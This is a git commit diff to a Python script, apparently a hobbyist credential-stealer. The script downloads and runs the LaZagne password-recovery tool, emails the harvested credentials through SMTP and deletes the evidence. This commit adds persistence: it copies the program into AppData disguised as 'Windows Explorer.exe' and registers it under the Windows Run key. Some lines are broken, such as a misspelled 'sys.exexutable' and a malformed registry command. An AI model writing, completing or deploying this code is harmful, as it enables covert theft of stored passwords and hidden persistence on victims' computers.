4054691a4be9a3f74dd77002a2ad746fba00c288
Justin Avina <jt.avina@icloud.com>
2022-05-10 23:48:02 -0700

    added persistence with new modules

--- Download.py
+++ Download.py
@@ -1,6 +1,15 @@
 import requests
 import subprocess
 import smtplib
+import os
+import tempfile
+import shutil
+
+def become_persistent():
+    Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
+    if not os.path.exists(Malocation):
+        shutil.copyfile(sys.exexutable, Malocation)
+        subprocess.call('reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run /v Explorer /t REG_SZ /d Exexutables/Download.exe "' + Malocation + '"', shell=True)
 
 def Download(url):
     GetResponse = requests.get(url)
@@ -19,9 +28,13 @@ def SendMail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)
+
 Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
 
 result = subprocess.check_output("lazagne.exe all", shell=True);
 print(result)
 
 SendMail("", "", result)
+os.remove("lazagne.exe")
